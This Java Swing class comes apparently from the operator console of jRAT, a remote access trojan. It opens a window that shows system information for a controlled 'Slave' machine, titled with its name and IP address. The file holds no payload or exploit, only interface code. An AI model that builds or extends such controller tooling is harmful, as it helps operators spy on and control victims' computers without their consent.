package jrat.controller.ui.frames;

import iconlib.IconUtils;
import jrat.controller.Slave;
import jrat.controller.ui.panels.PanelControlSystemInfo;

import javax.swing.*;
import javax.swing.border.EmptyBorder;
import java.awt.*;

@SuppressWarnings("serial")
public class FrameSystemInfo extends BaseFrame {

	private JPanel contentPane;

	public FrameSystemInfo(Slave slave) {
		setIconImage(IconUtils.getIcon("computer").getImage());
		setTitle("System Info - " + "[" + slave.getDisplayName() + "] - " + slave.getIP());
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		
		setBounds(100, 100, 450, 300);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		contentPane.setLayout(new BorderLayout(0, 0));
		setContentPane(contentPane);
		contentPane.add(new PanelControlSystemInfo(slave));
		

	}

}
